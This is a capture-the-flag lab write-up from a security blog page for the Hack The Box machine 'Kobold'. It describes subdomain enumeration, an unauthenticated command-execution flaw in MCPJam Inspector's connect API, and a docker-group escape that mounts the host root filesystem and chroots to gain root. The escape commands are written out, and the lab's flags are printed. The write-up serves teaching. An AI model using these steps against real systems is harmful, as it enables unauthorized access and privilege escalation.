@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kobold // Lab Report // crimson</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="../favicon.svg">
+<link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<div class="glow"></div>
+<div class="crt-overlay" aria-hidden="true"></div>
+
+<header class="site">
+  <nav>
+    <div class="logo glitch">~/<span>crimson</span>▋</div>
+    <div class="navlinks">
+      <a href="../index.html">Home</a>
+      <a href="../blog.html">Blog</a>
+      <a href="../reports.html" class="active">Lab Reports</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../projects.html">Projects</a>
+      <a href="../aboutme.html">About Me</a>
+    </div>
+    <div class="nav-status"><span class="status-dot"></span>online</div>
+  </nav>
+</header>
+
+<main>
+
+  <section class="page-head reveal visible" style="border-bottom:none;padding-bottom:0;">
+    <a href="../reports.html" class="back-link">← ls reports/</a>
+    <div class="eyebrow scramble">cat kobold.md</div>
+    <h1 class="page-title scramble glitch glow-heading">Kobold</h1>
+    <div class="writeup-meta">
+      <span class="tag">HTB</span><span class="tag diff easy">Easy</span><span class="tag">RCE</span><span class="tag">Enumeration</span><span class="tag">Misconfiguration</span>
+    </div>
+    <p class="writeup-summary">Kobold is an easy Linux machine where subdomain enumeration reveals an exposed MCPJam Inspector instance vulnerable to unauthenticated remote code execution. Exploiting CVE-2026-23744 provides a shell as ben, while a hidden Docker group membership allows Docker commands to be executed and the host filesystem to be mounted into a privileged container, resulting in root access.</p>
+    <div class="writeup-date">Solved: August 15, 2026</div>
+  </section>
+
+  <section class="reveal visible">
+    <div class="writeup-body">
+      <h2>Recon</h2>
+      <p>Started with a basic Nmap scan:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">nmap</div></div><div class="term-body"><div><span class="prompt">$</span> nmap -sCV -Pn 10.129.18.222</div></div></div>
+      <p>The scan identified three accessible services:</p>
+      <table class="writeup-table"><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH 9.6p1 Ubuntu 3ubuntu13.15</td></tr><tr><td>80</td><td>HTTP</td><td>nginx 1.24.0 (Ubuntu)</td></tr><tr><td>443</td><td>HTTPS</td><td>nginx 1.24.0 (Ubuntu)</td></tr></tbody></table>
+      <p>The HTTPS certificate revealed the hostname:</p>
+      <div class="output-block">Subject: commonName=kobold.htb
+Subject Alternative Name:
+DNS:kobold.htb
+DNS:*.kobold.htb</div>
+      <p>We added the hostname to <code>/etc/hosts</code>:</p>
+      <div class="output-block">10.129.18.222 kobold.htb</div>
+      <p>The wildcard certificate was particularly interesting because it suggested that additional subdomains could exist.</p>
+      <h2>Enumeration</h2>
+      <h3>HTTP - TCP 80/443</h3>
+      <p>Port 80 redirected to HTTPS:</p>
+      <div class="output-block">https://kobold.htb/</div>
+      <p>The main website did not expose an obvious attack path, so we moved on to virtual host enumeration.</p>
+      <h3>Subdomain Enumeration</h3>
+      <p>We fuzzed for subdomains under <code>kobold.htb</code>.</p>
+      <p>The scan revealed two interesting hosts:</p>
+      <div class="output-block">mcp.kobold.htb
+bin.kobold.htb</div>
+      <p>We added both to <code>/etc/hosts</code>:</p>
+      <div class="output-block">10.129.18.222 mcp.kobold.htb
+10.129.18.222 bin.kobold.htb</div>
+      <p>The two subdomains exposed different applications.</p>
+      <p><code>bin.kobold.htb</code> hosted PrivateBin, while <code>mcp.kobold.htb</code> hosted an MCPJam Inspector instance.</p>
+      <p>The MCP service was the more interesting target because it exposed an API capable of starting MCP server processes.</p>
+      <h3>MCPJam Inspector</h3>
+      <p>Navigating to:</p>
+      <div class="output-block">https://mcp.kobold.htb/</div>
+      <p>revealed an MCPJam Inspector interface.</p>
+      <p>Further enumeration identified the MCPJam Inspector version as:</p>
+      <div class="output-block">MCPJam Inspector v1.4.2</div>
+      <p>Research into this version revealed <span class="hl">CVE-2026-23744</span>, an unauthenticated remote code execution vulnerability in MCPJam Inspector.</p>
+      <p>The vulnerable endpoint was:</p>
+      <div class="output-block">/api/mcp/connect</div>
+      <p>The endpoint accepts a <code>serverConfig</code> object containing a command and arguments. Because the application does not properly authenticate or restrict these values, an attacker can cause the server to execute arbitrary commands.</p>
+      <h2>Initial Access</h2>
+      <p>We exploited the MCPJam Inspector vulnerability to execute commands on the target.</p>
+      <p>The vulnerable endpoint was:</p>
+      <div class="output-block">https://mcp.kobold.htb/api/mcp/connect</div>
+      <p>The request supplies a command through <code>serverConfig.command</code> and arguments through <code>serverConfig.args</code>.</p>
+      <p>After confirming command execution, we used the vulnerability to obtain a reverse shell.</p>
+      <p>The resulting shell was running as:</p>
+      <div class="output-block">ben</div>
+      <p>We verified the current user:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">whoami</div></div><div class="term-body"><div><span class="prompt">$</span> whoami</div></div></div>
+      <div class="output-block">ben</div>
+      <p>The shell was initially somewhat limited, so we upgraded it to a more usable interactive shell.</p>
+      <p>We then retrieved the user flag:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">cat</div></div><div class="term-body"><div><span class="prompt">$</span> cat /home/ben/user.txt</div></div></div>
+      <div class="output-block">e54763a76169233143ae9819aa97051e</div>
+      <p>At this point, we had obtained user-level access.</p>
+      <h2>Privilege Escalation</h2>
+      <p>After obtaining a shell as <code>ben</code>, we began enumerating local privileges.</p>
+      <p>One interesting service was Docker.</p>
+      <p>Initially, attempting to interact with the Docker daemon failed:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">docker</div></div><div class="term-body"><div><span class="prompt">$</span> docker ps</div></div></div>
+      <div class="output-block">permission denied while trying to connect to the Docker daemon socket</div>
+      <p>This suggested that <code>ben</code> did not appear to have normal Docker group access.</p>
+      <p>However, further enumeration revealed that Docker group access could be activated through the user's existing group configuration.</p>
+      <p>We switched into the Docker group:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">newgrp</div></div><div class="term-body"><div><span class="prompt">$</span> newgrp docker</div></div></div>
+      <p>After doing so, Docker commands worked:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">docker</div></div><div class="term-body"><div><span class="prompt">$</span> docker ps</div></div></div>
+      <p>The Docker daemon returned the currently running container:</p>
+      <div class="output-block">CONTAINER ID   IMAGE                               COMMAND                  CREATED        STATUS          PORTS                      NAMES
+4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   ...            Up ...          127.0.0.1:8080-&gt;8080/tcp   bin</div>
+      <p>This was a critical finding because membership in the <code>docker</code> group effectively provides control over the Docker daemon.</p>
+      <p>Docker can be abused to create a privileged container and mount directories from the host filesystem.</p>
+      <h2>Root</h2>
+      <p>We created a container using the existing PrivateBin image and mounted the host filesystem into <code>/mnt</code>:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">docker</div></div><div class="term-body"><div><span class="prompt">$</span> docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2</div></div></div>
+      <p>The container started with UID <code>0</code>:</p>
+      <div class="output-block">/var/www #</div>
+      <p>Inside the container, the host filesystem was available at:</p>
+      <div class="output-block">/mnt</div>
+      <p>We then changed the root directory to the mounted host filesystem:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">chroot</div></div><div class="term-body"><div><span class="prompt">$</span> chroot /mnt sh</div></div></div>
+      <p>Checking our privileges:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">id</div></div><div class="term-body"><div><span class="prompt">$</span> id</div></div></div>
+      <p>returned:</p>
+      <div class="output-block">uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)</div>
+      <p>We were now operating as <code>root</code> on the host filesystem.</p>
+      <p>Finally, we retrieved the root flag:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">cat</div></div><div class="term-body"><div><span class="prompt">$</span> cat /root/root.txt</div></div></div>
+      <div class="output-block">edd3eed2588cc6eecb8a2cda5dbfe6ab</div>
+      <p>The machine was fully compromised.</p>
+      <h2>Key Takeaways</h2>
+      <ul class="takeaway-list"><li><span class="hl">Pay attention to TLS certificates.</span> The wildcard certificate for <code>*.kobold.htb</code> was a strong indication that additional virtual hosts were worth enumerating.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Enumerate subdomains thoroughly.</span> <code>mcp.kobold.htb</code> exposed the MCPJam Inspector service that provided the initial attack path.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Identify versions of exposed applications.</span> MCPJam Inspector v1.4.2 was vulnerable to CVE-2026-23744.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Look for unauthenticated APIs.</span> The <code>/api/mcp/connect</code> endpoint allowed arbitrary commands to be supplied to the MCP server process.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Enumerate local privileges after getting a shell.</span> Docker access was not immediately obvious because <code>docker ps</code> initially returned a permission error.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Check group configuration carefully.</span> <code>newgrp docker</code> activated Docker access for <code>ben</code>, providing control over the Docker daemon.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Docker group membership is effectively root-equivalent.</span> A user capable of controlling the Docker daemon can create containers with host filesystem mounts.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Host filesystem mounts can lead directly to root.</span> Mounting <code>/</code> into a privileged container and using <code>chroot</code> provided direct root access to the host.</li></ul>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site" style="padding-top:0;">
+  <div class="foot-bottom" style="max-width:1100px;margin:0 auto;padding:24px;border-top:1px solid var(--border);">
+    <div>crimson © 2026</div>
+    <div><a href="../reports.html" style="color:var(--text-dim);">← back to Lab Reports</a></div>
+  </div>
+</footer>
+
+<script src="../script.js"></script>
+</body>
+</html>
